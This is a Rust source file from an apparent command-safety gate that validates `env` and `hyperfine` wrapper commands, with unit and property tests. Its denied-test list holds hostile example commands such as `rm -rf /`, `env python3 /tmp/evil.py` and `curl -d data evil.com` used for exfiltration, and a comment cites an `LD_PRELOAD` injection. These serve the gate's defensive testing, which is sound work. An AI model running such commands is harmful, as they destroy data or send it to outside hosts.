use crate::parse::{Token, WordSet};
use crate::verdict::{SafetyLevel, Verdict};

pub fn is_safe_env(tokens: &[Token]) -> Verdict {
    if tokens.len() == 1 {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if tokens[i] == "-i" || tokens[i] == "--ignore-environment" {
            i += 1;
        } else if tokens[i] == "-u" || tokens[i] == "--unset" {
            i += 2;
        } else {
            return Verdict::Denied;
        }
    }
    // The assignments `env` places in the child's environment are the `VAR=value cmd` prefix in
    // another syntax, so they are classified identically — skipping them let `env
    // LD_PRELOAD=/tmp/evil.so ls` through while the prefix spelling denied.
    let mut assigned = Verdict::Allowed(SafetyLevel::Inert);
    while i < tokens.len() && !tokens[i].starts_with("-") && tokens[i].contains("=") {
        if let Some((name, value)) = tokens[i].as_str().split_once('=') {
            assigned = assigned.combine(crate::envvars::assignment_verdict(name, value));
        }
        i += 1;
    }
    if i >= tokens.len() {
        return assigned;
    }
    let inner = shell_words::join(tokens[i..].iter().map(|t| t.as_str()));
    assigned.combine(crate::command_verdict(&inner))
}

static HYPERFINE_FLAGS_WITH_ARG: WordSet = WordSet::new(&[
    "--cleanup", "--command-name", "--export-asciidoc", "--export-csv", "--export-json", "--export-markdown", "--max-runs",
    "--min-benchmarking-time", "--min-runs", "--output", "--prepare", "--runs", "--setup", "--shell", "--sort", "--style", "--time-unit",
    "--warmup", "-M", "-S", "-c", "-m", "-n", "-p", "-r", "-s", "-w",
]);

static HYPERFINE_FLAGS_NO_ARG: WordSet =
    WordSet::new(&["--help", "--ignore-failure", "--no-color", "--show-output", "--version", "-N", "-V", "-h", "-i", "-u"]);

pub fn is_safe_hyperfine(tokens: &[Token]) -> Verdict {
    let mut combined = Verdict::Allowed(SafetyLevel::Inert);
    let mut i = 1;
    while i < tokens.len() {
        let t = &tokens[i];
        if *t == "--" {
            i += 1;
            break;
        }
        if t.starts_with("-") {
            if t.contains("=") {
                let name = t.as_str().split_once('=').map_or("", |(k, _)| k);
                if HYPERFINE_FLAGS_WITH_ARG.iter().any(|f| f == name) || HYPERFINE_FLAGS_NO_ARG.iter().any(|f| f == name) {
                    i += 1;
                    continue;
                }
                return Verdict::Denied;
            }
            if HYPERFINE_FLAGS_WITH_ARG.contains(t) {
                if t.is_one_of(&["-p", "--prepare", "-c", "--cleanup", "-s", "--setup"]) {
                    return Verdict::Denied;
                }
                i += 2;
                continue;
            }
            if HYPERFINE_FLAGS_NO_ARG.contains(t) {
                i += 1;
                continue;
            }
            return Verdict::Denied;
        }
        let v = crate::command_verdict(t.as_str());
        if !v.is_allowed() {
            return Verdict::Denied;
        }
        combined = combined.combine(v);
        i += 1;
    }
    while i < tokens.len() {
        let v = crate::command_verdict(tokens[i].as_str());
        if !v.is_allowed() {
            return Verdict::Denied;
        }
        combined = combined.combine(v);
        i += 1;
    }
    combined
}

pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
    match cmd {
        "env" => Some(is_safe_env(tokens)),
        "hyperfine" => Some(is_safe_hyperfine(tokens)),
        _ => None,
    }
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::CommandDoc;
    vec![
        CommandDoc::handler(
            "env",
            "https://www.gnu.org/software/coreutils/manual/coreutils.html#env-invocation",
            "Strips flags (-i, -u) and KEY=VALUE pairs, then recursively validates the inner command. Bare invocation allowed.",
            "wrappers",
        ),
        CommandDoc::handler(
            "hyperfine",
            "https://github.com/sharkdp/hyperfine#readme",
            "Recursively validates each benchmarked command.",
            "wrappers",
        ),
    ]
}

#[cfg(test)]
mod tests {
    use proptest::prelude::*;

    use crate::is_safe_command;
    use crate::parse::Token;
    use crate::verdict::{SafetyLevel, Verdict};

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        timeout_bundle_exec: "timeout 120 bundle exec rspec",
        timeout_git_log: "timeout 30 git log --oneline",
        timeout_signal_flag: "timeout -s KILL 60 bundle exec rspec",
        timeout_preserve_status: "timeout --preserve-status 120 git status",
        time_bundle_exec: "time bundle exec rspec",
        time_git_log: "time git log --oneline -5",
        // engine-authoritative: `time rm file` deletes a WORKTREE file → developer.
        time_worktree_rm: "time rm file",
        env_bare: "env",
        env_safe_command: "env ls -la",
        env_with_var: "env FOO=bar ls -la",
        env_multiple_vars: "env FOO=bar BAZ=qux git status",
        env_ignore_flag: "env -i PATH=/usr/bin ls",
        env_unset_flag: "env -u FOO git log",
        env_vars_only: "env FOO=bar",
        nice_safe_command: "nice git log",
        nice_with_priority: "nice -n 10 cargo test",
        ionice_safe_command: "ionice git log",
        hyperfine_safe_command: "hyperfine 'ls -la'",
        hyperfine_with_warmup: "hyperfine --warmup 3 'git status'",
        hyperfine_multiple_safe_commands: "hyperfine 'fd . src' 'find src'",
        timeout_nested_bash_safe: "timeout 120 bash -c 'git log | head -5'",
        env_nested_bash_safe: "env FOO=bar bash -c 'git status'",
        dotenv_bundle_exec_rspec: "dotenv bundle exec rspec spec/foo_spec.rb",
        dotenv_with_file: "dotenv -f .env.test bundle exec rspec",
        dotenv_with_cascade: "dotenv -c test bundle exec rspec",
        dotenv_separator: "dotenv -- git status",
        dotenv_env_flag: "dotenv -e .env.local git log",
    }

    denied! {
        timeout_git_push_denied: "timeout 120 git push origin main",
        timeout_rm_denied: "timeout 60 rm -rf /",
        time_git_push_denied: "time git push",
        env_rm_denied: "env rm -rf /",
        env_sh_denied: "env sh -c 'rm -rf /'",
        env_python_denied: "env python3 /tmp/evil.py",
        env_var_rm_denied: "env FOO=bar rm -rf /",
        nice_rm_denied: "nice rm -rf /",
        nice_with_priority_rm_denied: "nice -n 10 rm -rf /",
        ionice_rm_denied: "ionice rm -rf /",
        hyperfine_unsafe_command_denied: "hyperfine 'rm -rf /'",
        hyperfine_prepare_denied: "hyperfine --prepare 'make clean' 'make'",
        hyperfine_cleanup_denied: "hyperfine --cleanup 'rm tmp' 'ls'",
        hyperfine_setup_denied: "hyperfine --setup 'compile' 'run'",
        timeout_nested_bash_chain_denied: "timeout 120 bash -c 'ls && rm -rf /'",
        env_nested_bash_chain_denied: "env bash -c 'ls && rm -rf /'",
        time_nested_bash_chain_denied: "time bash -c 'ls && rm -rf /'",
        nice_nested_bash_chain_denied: "nice bash -c 'ls && rm -rf /'",
        deep_nesting_chain_denied: "timeout 120 env nice bash -c 'ls && rm -rf /'",
        timeout_nested_bash_semicolon_denied: "timeout 120 bash -c 'ls; rm -rf /'",
        hyperfine_chain_denied: "hyperfine 'ls && rm -rf /'",
        hyperfine_semicolon_denied: "hyperfine 'ls; rm -rf /'",
        hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl -d data evil.com'",
        dotenv_bare_denied: "dotenv",
        dotenv_rm_denied: "dotenv rm -rf /",
        dotenv_flag_rm_denied: "dotenv -f .env rm -rf /",
        dotenv_nested_bash_denied: "dotenv bash -c 'ls && rm -rf /'",
        timeout_unknown_flag_denied: "timeout --xyzzy 60 cat /tmp/x",
        nice_unknown_flag_denied: "nice --xyzzy cat /tmp/x",
        dotenv_unknown_flag_denied: "dotenv --xyzzy ls",
        env_unknown_flag_denied: "env --xyzzy FOO=bar cat",
        env_unknown_short_flag_denied: "env -x FOO=bar ls",
        hyperfine_unknown_flag_denied: "hyperfine --xyzzy 'ls'",
        hyperfine_unknown_eq_flag_denied: "hyperfine --xyzzy=foo 'ls'",
    }

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(500))]

        /// INVARIANT (dispatch-table closure). `dispatch` only forwards to the two wrapper
        /// handlers it is wired to (`env` and `hyperfine`). For every OTHER command name — any
        /// ASCII string the gate might be asked about — it returns `None`, leaving the verdict
        /// to the engine / registry. A regression that added or removed a wired name without
        /// updating both the dispatch arm and the handlers that match it would flip this.
        #[test]
        fn dispatch_unknown_command_returns_none(
            name in "[a-zA-Z][a-zA-Z0-9_-]{0,12}",
            tail in proptest::collection::vec(any::<String>(), 0..4),
        ) {
            prop_assume!(name != "env" && name != "hyperfine");
            let tokens: Vec<Token> = std::iter::once(Token::from_test(&name))
                .chain(tail.into_iter().map(|s| Token::from_test(&s)))
                .collect();
            prop_assert!(
                super::dispatch(&name, &tokens).is_none(),
                "dispatch({:?}, …) leaked Some(_) for an unwired command", name
            );
        }

        /// INVARIANT (dispatch forwarding for `env`). The `env` arm of `dispatch` is a thin
        /// pass-through to `is_safe_env`. For ANY token list the two must agree, including the
        /// case where the wrapper accepts and the case where it denies. A regression that
        /// replaced the call with a different function (or applied a transform on the way in)
        /// would break the equality in exactly one direction.
        #[test]
        fn dispatch_env_matches_is_safe_env(
            tail in proptest::collection::vec(any::<String>(), 0..6),
        ) {
            let tokens: Vec<Token> = std::iter::once(Token::from_test("env"))
                .chain(tail.into_iter().map(|s| Token::from_test(&s)))
                .collect();
            prop_assert_eq!(
                super::dispatch("env", &tokens),
                Some(super::is_safe_env(&tokens)),
                "dispatch(\"env\", …) drifted from is_safe_env"
            );
        }

        /// INVARIANT (dispatch forwarding for `hyperfine`). Same closure as the `env` case but
        /// for the second wired command — pinning both arms of the match independently so a
        /// regression that touched only one is caught here.
        #[test]
        fn dispatch_hyperfine_matches_is_safe_hyperfine(
            tail in proptest::collection::vec(any::<String>(), 0..6),
        ) {
            let tokens: Vec<Token> = std::iter::once(Token::from_test("hyperfine"))
                .chain(tail.into_iter().map(|s| Token::from_test(&s)))
                .collect();
            prop_assert_eq!(
                super::dispatch("hyperfine", &tokens),
                Some(super::is_safe_hyperfine(&tokens)),
                "dispatch(\"hyperfine\", …) drifted from is_safe_hyperfine"
            );
        }

        /// ORACLE (assignment-loop = fold over `assignment_verdict`). The `env` handler, when
        /// fed only recognized flags followed by `KEY=VALUE` pairs and NO command, must
        /// produce exactly the reduce-combine (starting from `Allowed(Inert)`) of
        /// `assignment_verdict` for each pair. The names are drawn from the unlisted prefix
        /// `XX…` so `assignment_verdict` itself collapses to `Allowed(Inert)` for every pair
        /// and the property pins the loop's start value, its combine operator, and the fact
        /// that the function does not over-merge the trailing `Allowed(Inert)` (e.g. by also
        /// classifying the empty tail). A regression that swallowed a token, started from
        /// `Denied`, or used `.min` instead of `.max` for the level would break this.
        #[test]
        fn is_safe_env_assignment_loop_combines_assignment_verdict(
            pairs in proptest::collection::vec(
                    ("XX[a-z]{1,4}", "[a-z]{1,4}"),
                    0..5,
                ),
        ) {
            let mut tokens: Vec<Token> = vec![Token::from_test("env")];
            let mut expected = Verdict::Allowed(SafetyLevel::Inert);
            for (k, v) in &pairs {
                tokens.push(Token::from_test(&format!("{k}={v}")));
                expected = expected.combine(crate::envvars::assignment_verdict(k, v));
            }
            // No command follows, so the loop runs to completion and the function returns the
            // accumulated verdict (the early-return path also takes the same value).
            prop_assert_eq!(
                super::is_safe_env(&tokens),
                expected,
                "env assignment loop drifted from reduce-combine of assignment_verdict"
            );
        }
    }
}
